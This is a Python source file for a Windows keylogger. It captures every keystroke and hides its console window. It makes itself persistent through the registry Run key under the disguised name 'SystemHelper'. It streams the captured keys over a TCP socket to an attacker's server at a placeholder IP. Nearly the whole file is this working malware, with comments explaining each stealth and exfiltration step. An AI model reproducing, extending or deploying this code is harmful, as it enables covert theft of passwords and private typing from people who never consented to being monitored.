# windows_keylogger.py
import socket #Networkcomunucation for delay retries
import time  # Added missing import
from pynput import keyboard  # caputre key stroke
import win32gui  # For window hiding
import win32con  # For window hiding

# Configuration
LINUX_SERVER_IP = "Your_ip"  # Replace with Linux IP
LINUX_PORT = 5555

# Global variables
log = "" # A string to store captured keystrokes.
conn = None # A socket connection to the server.

def hide_console():
    """Hide the console window"""
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE) # Hides the console window to make the keylogger stealthier.

def connect_to_server():
    """Establish connection to Linux server with retries"""
    global conn
    while True:
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((LINUX_SERVER_IP, LINUX_PORT))
            return
        except Exception as e:
            time.sleep(5)  # Establishes a connection to the Linux server with retries. If the connection fails, it waits for 5 seconds before trying again.

def on_press(key):
    """Handle key press events"""
    global log
    try:
        log += str(key.char)
    except AttributeError:
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.ctrl_l: '[CTRL]',
            keyboard.Key.alt_l: '[ALT]'
        }
        log += special_keys.get(key, f'[{key.name}]')  # Captures key press events and appends them to the log string. Special keys (like space, enter, tab) are handled separately.

def on_release(key):
    """Handle key release events"""
    global log
    if key == keyboard.Key.esc:
        return False  # Stop listener
    
    if len(log) >= 10:  # Send every 10 characters
        try:
            conn.sendall(log.encode())
            log = ""
        except Exception as e:
            connect_to_server() # Handles key release events. If the Esc key is pressed, the listener stops. If the log string reaches 10 characters, 
                                # it sends the data to the server and clears the log. If sending fails, it attempts to reconnect to the server.

def persist():
    """Add persistence via registry"""
    import winreg
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "SystemHelper", 0, winreg.REG_SZ, __file__)
        winreg.CloseKey(reg_key)
    except Exception as e:
        pass  # Adds persistence by writing the script's path to the Windows registry, ensuring it runs on startup.

if __name__ == "__main__":
    hide_console()
    persist()
    connect_to_server()
    
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()
    
    if conn:
        conn.close()  # Hides the console, adds persistence, connects to the server, and starts listening for keystrokes. 
                      # The listener runs until the Esc key is pressed, at which point it stops and closes the connection.
